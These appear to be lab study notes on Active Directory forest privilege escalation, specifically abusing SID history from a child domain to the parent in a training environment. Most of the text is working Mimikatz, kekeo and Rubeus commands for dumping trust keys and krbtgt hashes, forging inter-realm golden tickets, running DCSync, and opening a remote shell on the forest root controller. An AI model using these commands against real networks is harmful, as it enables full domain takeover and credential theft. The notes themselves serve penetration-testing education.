Now, we have compromised most machines in one domain example dollarcorp.moneycorp.local and also got domain admin access in dollarcorp.moneycorp.local domain. We need to move laterally to other domains like rupeescorp.moneycorp.local or child domain of dollarcorp.moneycorp.local which might be us.dollarcorp.moneycorp.local in order to do this we perform these attacks. So, if any one single domain is compromised in a forest the entire forest is compromised because domains in forest have bidirectional trust with each other.

- every computer and user object in dollarcorp.moneycorp.local can access every user and computer object in rupeescorp.moneycorp.local and vice versa due to bidirectional trust. till now we compromised every machine in dollarcorp.moneycorp.local domain now time to move to another domain.

# Child TO Parent(from dollarcorp.moneycorp.local to moneycorp.local)
sIDHistoryis a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory. 
sIDHistorycan be abused in two ways of escalating privileges within a forest:
- krbtgthash of the child
- Trust key

## Kerberos working across child and parent domains.
Since there is bi directional trust across domains in a forest and suppose a client wants to access a service residing in another domain how does kerberos work?

- Client requests TGT from the DC of their own domain(dollarcorp.moneycorp.local)
- Client receives TGT from the dollarcorp.moneycorp.local DC
- Client requests ST for service residing in moneycorp.local domain(parent domain)
- DC checks the SPN which service the client is asking ST for and sees the service to be in another domain which is parent domain(moneycorp.local)
- DC provides inter forest TGT to client(This inter realm TGT is encrypted using a trust key for parent and child domain, this trust key is present in DC of both domains.)
- Client sends inter forest TGT to DC of another domain parent domain(moneycorp.local) and asks for ST
- moneycorp.local's DC  decrypts the inter realm TGT using the trust key and is successful sends ST to the client
- Client presents the ST to service in moneycorp.local
- The service provides access.

## Abusing this functionality using trust keys
IF we have domain admin access in one domain we can extract the trust key and forge inter realm TGT. While forging the inter realm TGT we write in the TGT that the sid history is for enterprise administrator and encrypt the TGT using trust key after the client presents the forged TGT to the DC of forest root/parent domain/ moneycorp.local domain it decrypts the TGT using its own copy of the trust key and sees the sid history for enterprise administrator and provides access to that service as enterprise administrator.

## Extracting trust keys
Look for trust keys [In] child.domain -> prent.domain and extract rc4
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
```  
OR

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```
- After this we can forget the inter realm TGT
```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
```
- The first sid parameter is the sid of current domain
- the second sids parameter is the sid of enterprise administrators group of the parent domain 519 is default
- rc4 is the rc4 of the trust key
- target is parent domain
- ticket is the path to where the ticket should be saved.

## ACcess using keko
```
.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
```
```
.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
```
```
ls \\mcorp-dc.moneycorp.local\c$
```
Tickets for other services (like HOST and RPCSS for WMI, HTTP for PowerShell Remoting and WinRM) can be created as well.

## Using rubeus
```
Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```
```
ls \\mcorp-dc.moneycorp.local\c$
```

## Abusing this functionality using krbtgt
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```
```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit" 
```
- In the above command, the mimkatzoption "/sids" is forcefully setting the sIDHistoryfor the Enterprise Admin group for dollarcorp.moneycorp.localthat is the Forest Enterprise Admin Group.
```
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"' 
```
```
ls \\mcorp-dc.moneycorp.local.kirbi\c$
```

- We can also access the shell or command line by running dcsync and getting aes hash of administrator of forest root
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\administrator /domain:moneycorp.local" "exit"
```
```
Rubeus.exe asktgt /user:moneycorp.local\administrator /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /aes256:a8596906b00af56 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
```
winrs -r:mcorp-dc cmd
```

